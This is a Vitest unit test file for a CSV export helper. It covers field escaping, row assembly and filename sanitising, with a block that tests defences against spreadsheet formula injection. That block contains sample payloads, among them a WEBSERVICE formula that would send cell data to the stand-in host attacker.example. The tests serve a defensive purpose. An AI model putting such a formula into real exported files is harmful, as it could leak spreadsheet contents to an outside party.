import { describe, expect, it } from "vitest";
import { csvEscape, toCsv, csvFilename } from "./csv";

describe("csvEscape", () => {
  it("returns plain string when no special chars", () => {
    expect(csvEscape("hello")).toBe("hello");
  });

  it("returns empty string for null/undefined", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("quotes fields containing a comma", () => {
    expect(csvEscape("a,b")).toBe('"a,b"');
  });

  it("quotes and doubles internal quotes", () => {
    expect(csvEscape('she said "hi"')).toBe('"she said ""hi"""');
  });

  it("quotes fields containing newline", () => {
    expect(csvEscape("line1\nline2")).toBe('"line1\nline2"');
    expect(csvEscape("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("stringifies numbers without quoting", () => {
    expect(csvEscape(42)).toBe("42");
    expect(csvEscape(0)).toBe("0");
  });

  describe("formula injection neutralization", () => {
    it("prefixes '=' with a tab to block formula evaluation", () => {
      expect(csvEscape("=SUM(A1)")).toBe('"\t=SUM(A1)"');
    });

    it("prefixes '@' with a tab", () => {
      expect(csvEscape("@A1")).toBe('"\t@A1"');
    });

    it("prefixes leading tab with an extra tab", () => {
      expect(csvEscape("\t=cmd")).toBe('"\t\t=cmd"');
    });

    it("prefixes '+' operator payloads with a tab", () => {
      expect(csvEscape("+HYPERLINK(\"http://x\")")).toBe(
        '"\t+HYPERLINK(""http://x"")"',
      );
    });

    it("prefixes '-' operator payloads with a tab", () => {
      expect(csvEscape("-SUM(A1)")).toBe('"\t-SUM(A1)"');
    });

    it("does NOT prefix legitimate negative numeric strings", () => {
      expect(csvEscape("-2.50")).toBe("-2.50");
      expect(csvEscape("-0.00")).toBe("-0.00");
      expect(csvEscape("-123")).toBe("-123");
    });

    it("does NOT prefix legitimate positive numeric strings", () => {
      expect(csvEscape("+0.00")).toBe("+0.00");
      expect(csvEscape("+99.9")).toBe("+99.9");
    });

    it("handles WEBSERVICE-style payload (realistic exploit)", () => {
      const payload = '=WEBSERVICE("https://attacker.example/"&ENCODEURL(A1))';
      const result = csvEscape(payload);
      expect(result.startsWith('"\t=')).toBe(true);
    });
  });
});

describe("toCsv", () => {
  it("emits a header row + data rows with CRLF + trailing CRLF", () => {
    const out = toCsv(
      ["a", "b"],
      [
        ["1", "2"],
        ["3", "4"],
      ],
    );
    expect(out).toBe("a,b\r\n1,2\r\n3,4\r\n");
  });

  it("escapes special chars in cells", () => {
    const out = toCsv(["name", "note"], [["Smith, J.", 'has "quotes"']]);
    expect(out).toBe(`name,note\r\n"Smith, J.","has ""quotes"""\r\n`);
  });

  it("emits header-only when no rows", () => {
    expect(toCsv(["a", "b"], [])).toBe("a,b\r\n");
  });
});

describe("csvFilename", () => {
  it("joins parts with hyphens and sanitizes unsafe chars", () => {
    expect(csvFilename(["aging", "vendor 3", "2026"])).toBe(
      "aging-vendor_3-2026.csv",
    );
  });
  it("filters falsy parts", () => {
    expect(csvFilename(["aging", "", "2026"])).toBe("aging-2026.csv");
  });
  it("falls back to 'export' when nothing usable", () => {
    expect(csvFilename([])).toBe("export.csv");
  });
  it("supports custom extension", () => {
    expect(csvFilename(["x"], "iif")).toBe("x.iif");
  });
});
